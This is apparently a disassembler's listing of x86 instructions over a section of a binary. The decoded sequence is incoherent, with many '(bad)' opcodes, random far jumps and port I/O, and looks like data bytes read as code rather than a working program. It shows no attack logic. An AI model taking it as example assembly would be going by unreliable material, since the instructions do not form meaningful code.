  41d80c:	dec    ecx
  41d80d:	add    BYTE PTR [ecx+0x3b],dl
  41d810:	adc    al,0x97
  41d812:	arpl   WORD PTR [ecx],si
  41d814:	retf   0x606a
  41d817:	add    dh,BYTE PTR [edx]
  41d819:	adc    eax,0x3004c05c
  41d81e:	or     edx,ecx
  41d820:	add    BYTE PTR [edi],ah
  41d822:	add    edx,ecx
  41d824:	iret   
  41d825:	and    BYTE PTR [edx+0x66],ch
  41d828:	sub    eax,0xc6e2ad77
  41d82d:	leave  
  41d82e:	call   0x2b8a7ec8
  41d833:	sbb    ch,ah
  41d835:	mov    ebp,0xf8a23ff3
  41d83a:	in     al,0xbe
  41d83c:	adc    al,0xef
  41d83e:	ficomp WORD PTR [ecx+0x7981ef15]
  41d844:	xchg   ebx,eax
  41d845:	xchg   esi,eax
  41d846:	push   es
  41d847:	xchg   ebx,eax
  41d848:	pop    edi
  41d849:	std    
  41d84a:	push   ds
  41d84b:	mov    ch,0xbf
  41d84d:	(bad)  
  41d84e:	shl    ch,cl
  41d850:	out    dx,al
  41d851:	adc    ch,BYTE PTR [ebx-0x6082f845]
  41d857:	and    eax,DWORD PTR [ebp+0x77]
  41d85a:	ds dec esp
  41d85c:	mov    ds:0x1f9fbe29,al
  41d861:	inc    ecx
  41d862:	jp     0x41d868
  41d864:	add    DWORD PTR [edi+0xf37f080],eax
  41d86a:	out    0xdf,eax
  41d86c:	xor    al,0x7a
  41d86e:	imul   esp,DWORD PTR [eax-0x5167d33f],0x6e700fee
  41d878:	push   ds
  41d879:	or     ebx,DWORD PTR [ebp+0x57]
  41d87c:	pop    ebx
  41d87d:	in     eax,0x16
  41d87f:	push   esi
  41d880:	dec    edx
  41d881:	loope  0x41d8d1
  41d883:	cld    
  41d884:	mov    ch,0x25
  41d886:	jmp    0x1e5:0xf466adb5
  41d88d:	out    0x8b,eax
  41d88f:	(bad)  
  41d890:	xchg   ebx,eax
  41d891:	in     al,0xe3
  41d893:	xor    eax,0xeab7e1
  41d898:	std    
  41d899:	mov    bh,0xa7
  41d89b:	push   eax
  41d89c:	mov    WORD PTR [edx+0x41],ds
  41d89f:	ret    
  41d8a0:	inc    ah
  41d8a2:	jb     0x41d829
  41d8a4:	add    eax,0x8a9bdff8
  41d8a9:	ja     0x41d85f
  41d8ab:	or     DWORD PTR [ecx],esp
  41d8ad:	or     dh,al
  41d8af:	pop    esi
  41d8b0:	xor    dl,BYTE PTR [esi+edi*8-0xa56281b]
  41d8b7:	pop    edi
  41d8b8:	pop    esp
  41d8b9:	mov    edx,0x2368cdea
  41d8be:	mov    bh,0x43
  41d8c0:	jmp    0xd14a:0x49540c7f
  41d8c7:	add    eax,0xb6f5b4c3
  41d8cc:	and    DWORD PTR [esi],eax
  41d8ce:	arpl   bx,cx
  41d8d0:	pushf  
  41d8d1:	dec    esi
  41d8d2:	jbe    0x41d8f7
  41d8d4:	and    esp,DWORD PTR [ebx+0x3bd821d0]
  41d8da:	std    
  41d8db:	mov    dh,0x4
  41d8dd:	dec    ebx
  41d8de:	adc    al,0xa
  41d8e0:	mov    dl,0xa3
  41d8e2:	loop   0x41d86a
  41d8e4:	xlat   BYTE PTR ds:[ebx]
  41d8e5:	data16 jne 0x41d90b
  41d8e8:	outs   dx,DWORD PTR ds:[esi]
  41d8e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ea:	hlt    
  41d8eb:	mov    al,0x5b
  41d8ed:	(bad)  
  41d8ef:	imul   ebx,DWORD PTR [ecx],0x63
  41d8f2:	pop    ebx
  41d8f3:	inc    ebx
  41d8f4:	dec    edx
  41d8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8f6:	pop    eax
  41d8f7:	cmp    al,0x9d
  41d8f9:	xor    ecx,ecx
  41d8fb:	and    eax,0x33c45ac2
  41d900:	jecxz  0x41d92a
  41d902:	daa    
  41d903:	cmp    BYTE PTR [eax],dh
  41d905:	cdq    
  41d906:	lea    ecx,[edi]
  41d908:	scas   eax,DWORD PTR es:[edi]
  41d909:	push   fs
  41d90b:	mov    eax,0x5af67b5b
  41d910:	sar    BYTE PTR [esi+0x58ded16d],1
  41d916:	mov    dl,0xfe
  41d918:	sub    edx,DWORD PTR [ebx]
  41d91a:	mov    esi,0x4a08f7cd
  41d91f:	sbb    ebx,DWORD PTR [ecx+eax*1]
  41d922:	iret   
  41d923:	push   0x6a93a919
  41d928:	lods   al,BYTE PTR ds:[esi]
  41d929:	sbb    DWORD PTR [ecx],0x8ca4f68d
  41d92f:	or     edx,DWORD PTR [edx-0x68]
  41d932:	nop
  41d933:	imul   eax,DWORD PTR [ebp-0x6e],0xb5916098
  41d93a:	mov    ch,0xd5
  41d93c:	push   ds
  41d93d:	ins    DWORD PTR es:[edi],dx
  41d93e:	mov    al,0x2c
  41d940:	das    
  41d941:	cmp    BYTE PTR [ebx-0x75],ah
  41d944:	call   0xdedaa264
  41d949:	push   ds
  41d94a:	adc    al,BYTE PTR [ecx-0xf]
  41d94d:	jae    0x41d8f9
  41d94f:	mov    ebx,0x722b1eba
  41d954:	stos   DWORD PTR es:[edi],eax
  41d955:	in     al,0x25
  41d957:	push   esi
  41d958:	mul    DWORD PTR [ebx]
  41d95a:	hlt    
  41d95b:	inc    esi
  41d95c:	mov    ebp,0x1b0e148c
  41d961:	jecxz  0x41d919
  41d963:	call   0x383c0cf7
  41d968:	and    BYTE PTR [edx-0x1beaef78],0x51
  41d96f:	mov    esi,0x20b566ac
  41d974:	pop    esp
  41d975:	into   
  41d976:	clc    
  41d977:	cmp    eax,0x30448a78
  41d97c:	shl    BYTE PTR [ebp+0xc],0x55
  41d980:	pop    ebx
  41d981:	sbb    ecx,DWORD PTR [ecx+edx*4-0x4dea84ca]
  41d988:	stos   DWORD PTR es:[edi],eax
  41d989:	mov    al,0xad
  41d98b:	inc    ecx
  41d98c:	data16 mov ah,0x6b
  41d98f:	dec    edi
  41d990:	inc    ebx
  41d991:	shr    BYTE PTR [ecx],cl
  41d993:	sbb    BYTE PTR [edi-0x3c0081cb],bh
  41d999:	lahf   
  41d99a:	sub    al,0x36
  41d99c:	(bad)  
  41d99d:	mov    al,ds:0xf55e31c3
  41d9a2:	loop   0x41d986
  41d9a4:	mov    al,0x93
  41d9a6:	inc    esp
  41d9a7:	cmp    bh,al
  41d9a9:	cmp    edi,ecx
  41d9ab:	sbb    al,0x67
  41d9ad:	lock enter 0xf6d,0x23
  41d9b2:	mov    eax,0xb193cd60
  41d9b7:	nop
  41d9b8:	movzx  ebp,cx
  41d9bb:	out    0x97,al
  41d9bd:	cwde   
  41d9be:	loopne 0x41d9cd
  41d9c0:	cmp    BYTE PTR [edx],0x1f
  41d9c3:	dec    ebp
  41d9c4:	les    edx,FWORD PTR [ebp-0x1973f07a]
  41d9ca:	fadd   DWORD PTR [ebx+0x1301df35]
  41d9d0:	pusha  
  41d9d1:	xchg   esp,eax
  41d9d2:	dec    eax
  41d9d3:	or     BYTE PTR [edx-0x69a41b2c],ch
  41d9d9:	push   eax
  41d9da:	sub    ebx,DWORD PTR [edi-0x67]
  41d9dd:	sub    DWORD PTR [ecx-0x20],esp
  41d9e0:	fdiv   DWORD PTR [ebp-0x3d]
  41d9e3:	mov    al,ds:0x5b26c914
  41d9e8:	mov    bl,0x48
  41d9ea:	mov    bl,0x15
  41d9ec:	xor    dh,dl
  41d9ee:	push   ecx
  41d9ef:	push   esp
  41d9f0:	in     al,0xc
  41d9f2:	lock and ah,dl
  41d9f5:	jge    0x41da12
  41d9f7:	stos   BYTE PTR es:[edi],al
  41d9f8:	mov    edi,0xedf98e99
  41d9fd:	sub    bh,bh
  41d9ff:	mov    DWORD PTR [edi+0x4e],eax
  41da02:	gs ret 
  41da04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da05:	push   ss
  41da06:	xor    BYTE PTR [ebx-0x4a],0x9b
  41da0a:	inc    esp
  41da0b:	inc    ebp
  41da0c:	jecxz  0x41d9b6
  41da0e:	xchg   ecx,eax
  41da0f:	imul   edx,DWORD PTR [esi-0x6ea72d66],0x4e9c3bed
  41da19:	mov    dl,0x11
  41da1b:	inc    ebx
  41da1c:	(bad)  
  41da1d:	jnp    0x41da8b
  41da1f:	gs cmp ecx,esp
  41da22:	mov    ah,0x71
  41da24:	mov    DWORD PTR [ecx-0x4c],edx
  41da27:	mov    ?,edx
  41da29:	stos   DWORD PTR es:[edi],eax
  41da2a:	xlat   BYTE PTR ds:[ebx]
  41da2b:	pop    ss
  41da2c:	(bad)  
  41da2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da2e:	mov    dl,0xa5
  41da30:	or     bl,BYTE PTR [esi]
  41da32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da33:	ret    0x7b87
  41da36:	call   0x35f3f583
  41da3b:	stos   DWORD PTR es:[edi],eax
  41da3c:	push   eax
  41da3d:	pusha  
  41da3e:	pop    ebp
  41da3f:	jge    0x41da70
  41da41:	inc    esp
  41da42:	imul   ebx,DWORD PTR [edi-0x5bf07a44],0xffffff8b
  41da49:	inc    BYTE PTR [ebx]
  41da4b:	cmp    cl,BYTE PTR [edx]
  41da4d:	add    DWORD PTR [eax+0x5a],ebp
  41da50:	jecxz  0x41d9f9
  41da52:	sar    eax,1
  41da54:	xchg   DWORD PTR [ebp-0x42c5fcdf],edi
  41da5a:	mov    esi,0x9bf2a120
  41da5f:	xor    bl,BYTE PTR [esp+ebp*2-0xe]
  41da63:	pop    esi
  41da64:	push   0xffffff88
  41da66:	and    al,0x9a
  41da68:	mov    ah,0x16
  41da6a:	xor    BYTE PTR [ecx+0x30],bh
  41da6d:	add    eax,DWORD PTR [edx]
  41da6f:	sbb    eax,0x6134c5e3
  41da74:	fisubr WORD PTR [ebp-0x5e]
  41da77:	and    eax,0x8fbb4bb2
  41da7c:	xchg   edi,eax
  41da7d:	xchg   esp,eax
  41da7e:	fwait
  41da7f:	sub    dl,BYTE PTR [ebp+0x6f]
  41da82:	jns    0x41da4a
  41da84:	ins    DWORD PTR es:[edi],dx
  41da85:	jecxz  0x41daae
  41da87:	mov    DWORD PTR [ecx+0x4d],eax
  41da8a:	push   cs
  41da8b:	jecxz  0x41da7c
  41da8d:	push   0xffffff98
  41da8f:	jmp    0x41da16
  41da91:	mov    esp,0x47720685
  41da96:	data16 fsubr DWORD PTR [esi+0x60b4bde5]
  41da9d:	loop   0x41da38
  41da9f:	fist   DWORD PTR [ebp+0x5a]
  41daa2:	add    eax,0x5b82b249
  41daa7:	inc    ebx
  41daa8:	pop    ecx
  41daa9:	push   ebp
  41daaa:	mov    ebx,0x17a02039
  41daaf:	shr    esp,cl
  41dab1:	cmp    eax,0x9038d086
  41dab6:	stos   DWORD PTR es:[edi],eax
  41dab7:	add    edi,ebp
  41dab9:	lods   al,BYTE PTR ds:[esi]
  41daba:	mov    BYTE PTR [esi-0x1a],bh
  41dabd:	repnz push 0x17
  41dac0:	ret    0xd5e5
  41dac3:	or     eax,0xd27ced6a
  41dac8:	sbb    al,0x9d
  41daca:	inc    ecx
  41dacb:	daa    
  41dacc:	fidiv  WORD PTR [edi-0x5]
  41dacf:	in     eax,0xc6
  41dad1:	cmp    al,0x3f
  41dad3:	xchg   esi,eax
  41dad4:	xchg   ecx,eax
  41dad5:	push   0xdf93c2c4
  41dada:	lock out 0x76,eax
  41dadd:	inc    ecx
  41dade:	ss sti 
  41dae0:	arpl   WORD PTR [ebp+0x736f178d],cx
  41dae6:	pop    edx
  41dae7:	cld    
  41dae8:	pushf  
  41dae9:	out    dx,al
  41daea:	sbb    DWORD PTR [eax],0xffffffa5
  41daed:	fdiv   st(1),st
  41daef:	sar    esi,0xcf
  41daf2:	lahf   
  41daf3:	mov    bh,0xbc
  41daf5:	std    
  41daf6:	pusha  
  41daf7:	mov    edi,0x4be8ea7d
  41dafc:	mov    DWORD PTR [ebx+0x507c15d3],esp
  41db02:	int    0x75
  41db04:	dec    BYTE PTR [esi+0x48d137c]
  41db0a:	std    
  41db0b:	das    
  41db0c:	int    0xd1
  41db0e:	in     eax,0x95
  41db10:	xor    DWORD PTR [ecx+0x55],0x1feb621d
  41db17:	sbb    DWORD PTR [ebx+0x47],eax
  41db1a:	or     esp,DWORD PTR [ebp+0xa8328de]
  41db20:	shl    DWORD PTR [edx-0x35],0xa1
  41db24:	hlt    
  41db25:	mov    bh,0x29
  41db27:	mov    esp,0x7bb2adda
  41db2c:	xor    BYTE PTR [edx],dh
  41db2e:	gs mov dl,0xda
  41db31:	xor    al,0xfe
  41db33:	dec    ebp
  41db34:	inc    ecx
  41db35:	and    DWORD PTR [ecx+0x79dd49aa],esp
  41db3b:	adc    ah,bl
  41db3d:	jge    0x41db0c
  41db3f:	fisubr DWORD PTR [esi]
  41db41:	fsub   QWORD PTR [eax+0x22]
  41db44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db45:	clc    
  41db46:	dec    edi
  41db47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db48:	fs push edx
  41db4a:	and    al,0x92
  41db4c:	mov    eax,0x6f45825c
  41db51:	push   ebx
  41db52:	jge    0x41db49
  41db54:	jns    0x41db5b
  41db56:	push   0xa38e2e74
  41db5b:	jmp    0x4772:0x7da2dde8
  41db62:	and    ecx,DWORD PTR [ebp-0x54ffe9ac]
  41db68:	jns    0x41dbaa
  41db6a:	fst    DWORD PTR [ebp-0x6d]
  41db6d:	es jbe 0x41db94
  41db70:	sbb    eax,0x520917a7
  41db75:	adc    edi,DWORD PTR [eax]
  41db77:	inc    esi
  41db78:	int3   
  41db79:	leave  
  41db7a:	into   
  41db7b:	xor    BYTE PTR [ecx],ch
  41db7d:	inc    esi
  41db7e:	and    bh,0x7b
  41db81:	jmp    0x3fdbbc04
  41db86:	pop    ss
  41db87:	pop    eax
  41db88:	imul   esi,DWORD PTR [ecx+0x62],0xdc8b5617
  41db8f:	inc    esi
  41db90:	fist   DWORD PTR [esi]
  41db92:	test   eax,0xfd46bfba
  41db97:	jle    0x41dc07
  41db99:	aaa    
  41db9a:	sar    BYTE PTR [eax],cl
  41db9c:	iret   
  41db9d:	lahf   
  41db9e:	xchg   edx,eax
  41db9f:	pop    ss
  41dba0:	adc    BYTE PTR [ebp-0x7614fefb],ah
  41dba6:	data16 jns 0x41dbc4
  41dba9:	cmp    BYTE PTR [ecx-0x5b857c4f],bh
  41dbaf:	aad    0xda
  41dbb1:	lahf   
  41dbb2:	mov    esi,0x8340ccb3
  41dbb7:	jmp    0x4e8a6052
  41dbbc:	adc    al,0x76
  41dbbe:	fadd   DWORD PTR [eax-0x3e]
  41dbc1:	bound  ecx,QWORD PTR [eax]
  41dbc3:	dec    edi
  41dbc4:	shl    DWORD PTR [esi-0x253e9b49],cl
  41dbca:	mov    al,0x96
  41dbcc:	sbb    BYTE PTR fs:[ecx-0x3a],dl
  41dbd0:	add    eax,0x67edc020
  41dbd5:	stos   DWORD PTR es:[edi],eax
  41dbd6:	test   DWORD PTR [ebp+edx*1+0x78],esp
  41dbda:	ins    BYTE PTR es:[edi],dx
  41dbdb:	add    DWORD PTR [esp+ebx*2],edi
  41dbde:	mov    ds,WORD PTR [eax+0x3fc60a91]
  41dbe4:	and    al,0x5d
  41dbe6:	ret    0x3b4
  41dbe9:	add    al,BYTE PTR [eax*8+0x3f09a2bf]
  41dbf0:	xchg   esp,eax
  41dbf1:	retf   
  41dbf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbf3:	rol    BYTE PTR [eax+0x3e],1
  41dbf6:	inc    eax
  41dbf7:	imul   DWORD PTR [eax-0x24]
  41dbfa:	dec    ebx
  41dbfb:	lahf   
  41dbfc:	adc    al,0x52
  41dbfe:	jnp    0x41dbe5
  41dc00:	sub    eax,0xb82b9968
  41dc05:	stos   BYTE PTR es:[edi],al
  41dc06:	cmc    
  41dc07:	sub    BYTE PTR [esi-0x3afc17eb],al
  41dc0d:	ret    
  41dc0e:	lock sub eax,0x99e7c41a
  41dc14:	dec    ecx
  41dc15:	lea    edx,[esi]
  41dc17:	sub    DWORD PTR [ebx-0x50],0xffffff96
  41dc1b:	or     BYTE PTR ds:0xb9366427,al
  41dc21:	repz jno 0x41dbc2
  41dc24:	sbb    ecx,DWORD PTR [eax]
  41dc26:	mov    ds:0x41254b73,eax
  41dc2b:	mov    cl,0x1d
  41dc2d:	sub    esi,DWORD PTR [esi]
  41dc2f:	mov    ch,0x46
  41dc31:	outs   dx,DWORD PTR ds:[esi]
  41dc32:	pusha  
  41dc33:	bound  ecx,QWORD PTR [eax-0x56b057b6]
  41dc39:	sub    dh,BYTE PTR [ebx+0x45]
  41dc3c:	adc    dl,dl
  41dc3e:	sub    eax,0x939c706c
  41dc43:	or     esp,DWORD PTR [edi+0x7c]
  41dc46:	mov    eax,0x9ccf8717
  41dc4b:	jge    0x41dc9b
  41dc4d:	inc    ebp
  41dc4e:	icebp  
  41dc4f:	(bad)  
  41dc50:	and    esi,DWORD PTR [esi-0x52fa7b53]
  41dc56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc57:	push   edi
  41dc58:	xor    ecx,ebp
  41dc5a:	inc    esp
  41dc5b:	aas    
  41dc5c:	cmp    ebx,esp
  41dc5e:	dec    eax
  41dc5f:	bound  ebp,QWORD PTR [eax+0x72]
  41dc62:	sub    ah,BYTE PTR [ecx+eax*8+0x425e9eb]
  41dc69:	add    BYTE PTR [edi-0x36df5a21],0x3f
  41dc70:	mov    cl,0x75
  41dc72:	push   ebp
  41dc73:	test   eax,0x4375eb0d
  41dc78:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc7a:	outs   dx,DWORD PTR ds:[esi]
  41dc7b:	in     al,0x29
  41dc7d:	dec    ecx
  41dc7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7f:	mov    ebp,ds
  41dc81:	and    eax,0x8bf117ca
  41dc86:	or     esi,DWORD PTR [ebx]
  41dc88:	push   es
  41dc89:	cmp    BYTE PTR [ebx+0x6f76a889],al
  41dc8f:	jp     0x41dc2f
  41dc91:	and    al,0xfa
  41dc93:	hlt    
  41dc94:	lds    esi,FWORD PTR [ebp-0x1f01d021]
  41dc9a:	pusha  
  41dc9b:	loopne 0x41dc65
  41dc9d:	iret   
  41dc9e:	imul   BYTE PTR [edi-0x7a6001e5]
  41dca4:	imul   edi,eax,0xffffff93
  41dca7:	aad    0x6c
  41dca9:	pop    eax
  41dcaa:	or     BYTE PTR [esi-0x68],0x38
  41dcae:	lods   eax,DWORD PTR ds:[esi]
  41dcaf:	jns    0x41dc93
  41dcb1:	cli    
  41dcb2:	mov    bl,0xf7
  41dcb4:	mov    ebp,0x7a23c003
  41dcb9:	adc    DWORD PTR [edi+0xe1335ee],esp
  41dcbf:	or     BYTE PTR [eax*8-0x6c97a3e8],0xf7
  41dcc7:	and    bh,cl
  41dcc9:	mov    ch,0xf5
  41dccb:	inc    eax
  41dccc:	dec    edi
  41dccd:	outs   dx,DWORD PTR ds:[esi]
  41dcce:	push   ds
  41dccf:	push   ecx
  41dcd0:	adc    dh,dh
  41dcd2:	add    DWORD PTR [eax+0x0],edx
  41dcd5:	inc    edi
  41dcd6:	rol    BYTE PTR [ecx],0xa6
  41dcd9:	cmp    DWORD PTR [ebx],eax
  41dcdb:	xor    dl,BYTE PTR [eax+esi*2]
  41dcde:	adc    al,0x26
  41dce0:	mov    ds:0x5cda045e,al
  41dce5:	hlt    
  41dce6:	fisub  DWORD PTR [esi-0x6fa44fbb]
  41dcec:	cli    
  41dced:	shl    DWORD PTR [edi+esi*1-0x41],cl
  41dcf1:	sbb    BYTE PTR [esi+ebx*1-0x61],ch
  41dcf5:	dec    eax
  41dcf6:	fs jle 0x41dcbd
  41dcf9:	push   ss
  41dcfa:	pusha  
  41dcfb:	inc    eax
  41dcfc:	pop    ebx
  41dcfd:	dec    edi
  41dcfe:	int3   
  41dcff:	sub    al,0xaa
  41dd01:	jmp    0x3e32444
  41dd06:	xchg   ebx,eax
  41dd07:	dec    edi
  41dd08:	fadd   QWORD PTR [ecx-0x3]
  41dd0b:	mov    bl,0x51
  41dd0d:	push   ebx
  41dd0e:	fidivr DWORD PTR ds:0x713e3b3b
  41dd14:	shr    DWORD PTR [edi],cl
  41dd16:	pop    edi
  41dd17:	xor    DWORD PTR [edx],esp
  41dd19:	xor    dh,ch
  41dd1b:	mov    WORD PTR [ecx-0x47],fs
  41dd1e:	in     eax,dx
  41dd1f:	add    DWORD PTR [esi+0x27],0xf7c094c9
  41dd26:	addr16 jb 0x41dd21
  41dd29:	jecxz  0x41dd71
  41dd2b:	mov    cl,0x85
  41dd2d:	hlt    
  41dd2e:	cmp    al,BYTE PTR [ecx-0x6acb06e5]
  41dd34:	push   0x12
  41dd36:	stc    
  41dd37:	dec    edi
  41dd38:	pop    ds
  41dd39:	or     esp,DWORD PTR [esi+eax*4]
  41dd3c:	adc    cl,bl
  41dd3e:	pop    eax
  41dd3f:	inc    edi
  41dd40:	scas   eax,DWORD PTR es:[edi]
  41dd41:	pushf  
  41dd42:	mov    bh,0x55
  41dd44:	mov    ch,0x91
  41dd46:	mov    cl,0x2a
  41dd48:	mov    es,esp
  41dd4a:	gs fldlg2 
  41dd4d:	inc    esi
  41dd4e:	sub    al,0xae
  41dd50:	call   0x1f6d:0xe4cf4640
  41dd57:	stos   BYTE PTR es:[edi],al
  41dd58:	mov    bl,0x8b
  41dd5a:	call   0x7e8d:0x2b4d51e4
  41dd61:	cmp    bl,BYTE PTR [ebp-0x76]
  41dd64:	dec    esp
  41dd65:	jne    0x41dd18
  41dd67:	xor    BYTE PTR [eax+edx*2+0x4b68e09a],cl
  41dd6e:	mov    ebp,DWORD PTR [ecx*8-0x2e5b75af]
  41dd75:	xchg   BYTE PTR ds:[eax*8+0x2d70fb32],bh
  41dd7d:	ins    DWORD PTR es:[edi],dx
  41dd7e:	pop    ebp
  41dd7f:	es mov esp,edi
  41dd82:	sbb    bh,dh
  41dd84:	xor    eax,0xa2c6c41
  41dd89:	mov    ebx,0x6dd9fb2d
  41dd8e:	lea    edi,[edi+0x63ace1e6]
  41dd94:	add    DWORD PTR ds:0x847483b4,0xa2c375e8
  41dd9e:	or     ecx,edi
  41dda0:	lea    esp,[ecx+0x5435a275]
  41dda6:	push   ecx
  41dda7:	test   edi,esi
  41dda9:	out    dx,al
  41ddaa:	jl     0x41ddc3
  41ddac:	aaa    
  41ddad:	enter  0xf281,0x92
  41ddb1:	out    dx,eax
  41ddb2:	inc    ebp
  41ddb3:	mov    cl,0xd5
  41ddb5:	sbb    DWORD PTR [ecx],0xeff89b03
  41ddbb:	and    al,0x6f
  41ddbd:	push   ebp
  41ddbe:	aad    0x22
  41ddc0:	xor    ah,BYTE PTR [esi-0x48054e4d]
  41ddc6:	int    0xae
  41ddc8:	inc    edx
  41ddc9:	sbb    DWORD PTR [ecx-0x80],eax
  41ddcc:	mov    ebp,0xdd8a0871
  41ddd1:	ret    0x6188
  41ddd4:	dec    ebp
  41ddd5:	and    DWORD PTR ds:0xe783635b,0xffffff89
  41dddc:	mov    esi,0x9b2db7f2
  41dde1:	retf   
  41dde2:	push   0xffffffc9
  41dde4:	or     ebx,ecx
  41dde6:	pop    ebx
  41dde7:	test   al,0x6b
  41dde9:	adc    DWORD PTR [eax-0x4b],0x24
  41dded:	cmp    al,0xe4
  41ddef:	mov    al,ds:0xb2163b38
  41ddf4:	jbe    0x41de6c
  41ddf6:	inc    esi
  41ddf7:	int3   
  41ddf8:	in     eax,dx
  41ddf9:	mov    esi,0xc5d67b35
  41ddfe:	xchg   ecx,eax
  41ddff:	or     BYTE PTR [eax+eax*4-0x56],ch
  41de03:	outs   dx,BYTE PTR ds:[esi]
  41de04:	xor    DWORD PTR [ecx-0x49],ebx
  41de07:	cmp    eax,0xdece55f7
  41de0c:	shl    DWORD PTR [esi+0x4d410fdd],1
  41de12:	jmp    0xef1e:0xe1446ca5
  41de19:	fwait
  41de1a:	setbe  BYTE PTR [esi]
  41de1d:	mov    ebx,0xe0e49eeb
  41de22:	scas   eax,DWORD PTR es:[edi]
  41de23:	adc    esp,DWORD PTR [ebx]
  41de25:	loope  0x41de00
  41de27:	cli    
  41de28:	(bad)  
  41de29:	shl    BYTE PTR [ebp-0x61e226de],cl
  41de2f:	xchg   esi,eax
  41de30:	out    0x75,eax
  41de32:	neg    DWORD PTR [ecx-0x72]
  41de35:	(bad)  
  41de36:	pop    edi
  41de37:	aam    0x54
  41de39:	nop
  41de3a:	inc    ecx
  41de3b:	fld    TBYTE PTR [ecx+0x2c90477e]
  41de41:	or     DWORD PTR [esi+0x181654e2],0xec62e44e
  41de4b:	cdq    
  41de4c:	jl     0x41de78
  41de4e:	and    dl,BYTE PTR [edx+0x3f3b8721]
  41de54:	test   DWORD PTR [eax+0x25],0x9d854ca9
  41de5b:	iret   
  41de5c:	shl    DWORD PTR [ecx-0x55a7bc7f],0xd1
  41de63:	repnz in al,0xd4
  41de66:	aad    0x43
  41de68:	sti    
  41de69:	in     al,0x99
  41de6b:	add    DWORD PTR [ebx],eax
  41de6d:	fild   DWORD PTR [edi-0x411c83c0]
  41de73:	ffreep st(3)
  41de75:	jg     0x41de52
  41de77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de78:	jne    0x41deb7
  41de7a:	mov    BYTE PTR [edi-0x7e],dl
  41de7d:	xchg   edi,eax
  41de7e:	mov    bl,0xfa
  41de80:	fcmovbe st,st(1)
  41de82:	add    eax,0x97e5b6c5
  41de87:	aaa    
  41de88:	pop    ds
  41de89:	xchg   BYTE PTR [eax],bh
  41de8b:	cwde   
  41de8c:	cdq    
  41de8d:	dec    ebx
  41de8e:	xchg   ebx,eax
  41de8f:	es jae 0x41dead
  41de92:	out    0x1d,al
  41de94:	callw  0x882f
  41de98:	lods   al,BYTE PTR ds:[esi]
  41de99:	sub    eax,0x6d7dbcf7
  41de9e:	jb     0x41deca
  41dea0:	xchg   esi,eax
  41dea1:	lods   al,BYTE PTR ds:[esi]
  41dea2:	shl    ch,cl
  41dea4:	out    0xa1,eax
  41dea6:	xchg   ebp,eax
  41dea7:	or     eax,0xe7822c22
  41deac:	dec    edx
  41dead:	aam    0x55
  41deaf:	sar    BYTE PTR ds:0xb06d8ea6,cl
  41deb5:	stc    
  41deb6:	or     eax,DWORD PTR [edx]
  41deb8:	hlt    
  41deb9:	jg     0x41deba
  41debb:	add    BYTE PTR [esi+0x58250138],bl
  41dec1:	mov    ds:0x3545097c,eax
  41dec6:	lods   al,BYTE PTR ds:[esi]
  41dec7:	gs pop eax
  41dec9:	rol    edi,1
  41decb:	sub    eax,edi
  41decd:	rcl    esi,1
  41decf:	popf   
  41ded0:	inc    ebp
  41ded1:	sub    BYTE PTR [ebp+0x65],dl
  41ded4:	mov    esi,0x71616133
  41ded9:	(bad)  
  41deda:	jmp    0x41de88
  41dedc:	rcl    BYTE PTR [edx*1-0x514155fc],1
  41dee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee5:	push   0xda8f1f19
  41deea:	aad    0x7e
  41deec:	shl    BYTE PTR [edx],1
  41deee:	or     al,0x90
  41def0:	mov    ch,0x65
  41def2:	inc    ebp
  41def3:	fsubr  DWORD PTR ds:0xb2059e9c
  41def9:	inc    esi
  41defa:	fisubr DWORD PTR ds:0xdda58a00
  41df00:	fstp   QWORD PTR [esi+ebx*2]
  41df03:	gs mov ah,0xae
  41df06:	add    esi,DWORD PTR [esi+0x58cc7110]
  41df0c:	ins    DWORD PTR es:[edi],dx
  41df0d:	push   ds
  41df0e:	cmc    
  41df0f:	ins    DWORD PTR es:[edi],dx
  41df10:	retf   0x35bb
  41df13:	fcompp 
  41df15:	mov    ch,BYTE PTR [edi+0x3e]
  41df18:	not    DWORD PTR [bx+si+0x4c6e]
  41df1d:	fs jmp 0x68bb:0x41a92d50
  41df25:	es pop ss
  41df27:	or     DWORD PTR [esi],ebp
  41df29:	pop    ss
  41df2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2b:	into   
  41df2c:	std    
  41df2d:	mov    ebp,0x7d074f0c
  41df32:	pop    es
  41df33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df34:	retf   0xb7fd
  41df37:	jb     0x41dfb6
  41df39:	sub    dh,BYTE PTR [edi]
  41df3b:	mov    gs,WORD PTR [edx]
  41df3d:	jbe    0x41df00
  41df3f:	retf   0x1cc6
  41df42:	fnstenv [esi-0x3db38719]
  41df48:	stc    
  41df49:	mov    bh,0xd8
  41df4b:	xor    eax,0xb516a929
  41df50:	fs or  eax,0xdcd8801f
  41df56:	pop    edi
  41df57:	inc    esp
  41df58:	mov    ebp,0x2ad44e3a
  41df5d:	add    eax,0x9ae6cbca
  41df62:	js     0x41dfb2
  41df64:	jl     0x41dee8
  41df66:	pop    ds
  41df67:	jne    0x41dfbf
  41df69:	xchg   BYTE PTR [ebp+0x18],al
  41df6c:	adc    eax,0x8c00aa51
  41df71:	adc    eax,0xd82f2907
  41df76:	pusha  
  41df77:	mov    ds:0xb4930ee8,eax
  41df7c:	cmp    dl,BYTE PTR [ebx]
  41df7e:	xchg   ebx,ecx
  41df80:	mov    dl,0xa6
  41df82:	mov    bh,0x26
  41df84:	cmc    
  41df85:	fs add eax,0xfacd93e0
  41df8b:	mov    al,ds:0x2c2469f5
  41df90:	add    BYTE PTR [eax],0x83
  41df93:	mov    dl,0xdd
  41df95:	out    dx,eax
  41df96:	mov    ds:0xe32f1ffd,al
  41df9b:	cmp    al,0x58
